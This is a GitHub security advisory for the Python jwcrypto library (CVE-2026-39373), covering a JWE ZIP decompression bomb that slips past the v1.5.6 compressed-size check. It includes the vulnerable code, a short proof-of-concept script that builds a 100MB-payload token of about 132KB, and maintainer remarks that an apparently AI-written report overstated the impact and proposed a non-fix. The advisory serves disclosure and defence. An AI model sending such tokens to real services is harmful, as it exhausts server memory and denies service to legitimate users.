# [M] JWCrypto: JWE ZIP decompression bomb

## Summary
Severity: Medium
Advisory: GHSA-fjrm-76x2-c4q4
CVE: CVE-2026-39373
CWE: CWE-409
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-fjrm-76x2-c4q4
Type: github-advisory

## Affected
- PyPI: `jwcrypto` — affected >=0 <1.5.7

## Details
### Summary
The fix for GHSA-j857-7rvv-vj97 in v1.5.6 is weak in that it does not allow to fully control the amount of plaintext the receiver is willing to deal with and provides just a weak upper bound. The patch limits input token size to 250KB but does not validate the decompressed output size. An unauthenticated attacker can craft a JWE token under the 250KB input limit that decompresses to very large data that may exceed small devices memory availability, causing Denial of Service via memory exhaustion.

Although this is technically not unbounded I do recognize that it may be too much for devices and is something that could be surprising to developers, and we can do better than that.

NOTE: the original report was sloppy (probably AI slop) and claimed arbitrary memory consumption, but simple testing showed that while 100MB could be decompressed a 1GB output was denied because the token exceeded the 250K compressed serialization.

NOTE WELL: The proposed solution was also sloppy, proposing to first decompress the data completely in memory (therefore causing the memory exhaustion) and then checking how much memory was already used to deny the operation. I _intentionally_ left the "details" section untouched to show how bad AI slop is and how _uncritical_ the submitter was, even as it was obvious the "suggested fix" is actually no solution at all, as it was using the very call that he claimed was causing "arbitrary" memory exhaustion and wrapping it around an "if" ... the actual solution is in the resolving commit in version 1.5.7

### Details
The vulnerable code in `jwcrypto/jwe.py`:
```python
if len(data) > default_max_compressed_size:
    raise InvalidJWEData('Compressed data exceeds maximum allowed size')
self.plaintext = zlib.decompress(data, -zlib.MAX_WBITS)
```

The check validates `data` which is the **compressed** bytes, not the decompressed output. A 132KB token (under the 250KB limit) can decompress to approximately 100MB with no error raised.

### PoC
Tested on jwcrypto 1.5.6 (patched version):
```python
import zlib
from jwcrypto import jwe
from jwcrypto.jwk import JWK
import time

key = JWK.generate(kty='oct', size=128)
bomb_data = b"A" * 1024 * 1024 * 100  # 100MB uncompressed

token = jwe.JWE(
    plaintext=bomb_data,
    protected={"alg": "A128KW", "enc": "A128GCM", "zip": "DEF"}
)
token.add_recipient(key)
serialized = token.serialize(compact=True)
print(f"Token size: {len(serialized)/1024:.1f} KB")  # 132.8 KB — under 250KB limit

tok2 = jwe.JWE()
tok2.deserialize(serialized, key)
print(f"Decompressed: {len(tok2.plaintext)/1024/1024:.0f} MB")  # 100 MB
```

Output:
```
Token size: 132.8 KB
Decompressed: 100 MB
```

### Impact
An unauthenticated attacker can exhaust server memory by sending crafted JWE tokens with ZIP compression. The existing patch (v1.5.6) does not prevent this attack. An unauthenticated attacker can cause memory exhaustion on memory-constrained systems. A token under the 250KB input limit can decompress to approximately 100MB.

## References
- https://github.com/latchset/jwcrypto/security/advisories/GHSA-fjrm-76x2-c4q4
- https://nvd.nist.gov/vuln/detail/CVE-2026-39373
- https://github.com/latchset/jwcrypto/commit/25db861d8b29434838669a94a843af03d29ea6ed
- https://github.com/latchset/jwcrypto
- https://github.com/latchset/jwcrypto/releases/tag/v1.5.7
- https://github.com/pypa/advisory-database/tree/main/vulns/jwcrypto/PYSEC-2026-70.yaml
